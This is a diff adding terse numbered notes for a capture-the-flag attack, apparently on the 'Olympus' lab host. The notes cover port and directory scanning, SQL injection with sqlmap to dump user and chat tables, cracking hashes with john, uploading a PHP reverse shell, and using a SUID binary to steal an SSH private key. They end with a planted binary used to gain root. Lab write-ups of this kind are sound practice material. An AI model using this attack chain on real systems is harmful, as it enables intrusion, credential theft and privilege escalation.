@@ -1,0 +1,26 @@
+1 - echo "10.10.73.14 olympus.thm" | tee -a /etc/hosts
+2 - nmap -A 10.10.73.14
+3 - gobuster dir -u http://olympus.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
+4 - http://olympus.thm/~webmaster/index.php -> Search: 1' -> Burp Suite -> Save Request
+5 - sqlmap -r request.txt --dbs
+6 - sqlmap -r request.txt -D olympus --tables
+7 - sqlmap -r request.txt -D olympus -T flag --dump 
+8 - sqlmap -r request.txt -D olympus -T users --dump
+9 - john hash -w=/usr/share/wordlists/rockyou.txt
+10 - http://olympus.thm/~webmaster/admin/
+11 - echo "10.10.73.14 chat.olympus.thm" | tee -a /etc/hosts
+12 - http://chat.olympus.thm
+13 - cp /usr/share/webshells/php/php-reverse-shell.php .
+14 - sqlmap -r request.txt -D olympus -T chats --dump
+15 - http://chat.olympus.thm/uploads/34dde53cec8ef47d770d8a744e87ce56.php
+16 - cat /home/zeus/user.flag
+17 - find / -perm -u=s -type f 2>/dev/null
+18 - /usr/bin/cputils -> /home/zeus/.ssh/id_rsa -> /home/zeus/id_rsa
+19 - ssh2john id_rsa > hash
+20 - john hash -w=/usr/share/wordlists/rockyou.txt
+21 - ssh -i id_rsa zeus@10.10.73.14
+22 - find / -name "*lxd" 2>/dev/null
+23 - cd /var/www/html
+24 - cat *.php
+25 - uname -a; w; /lib/defended/libc.so.99
+26 - cat /root/root.flag
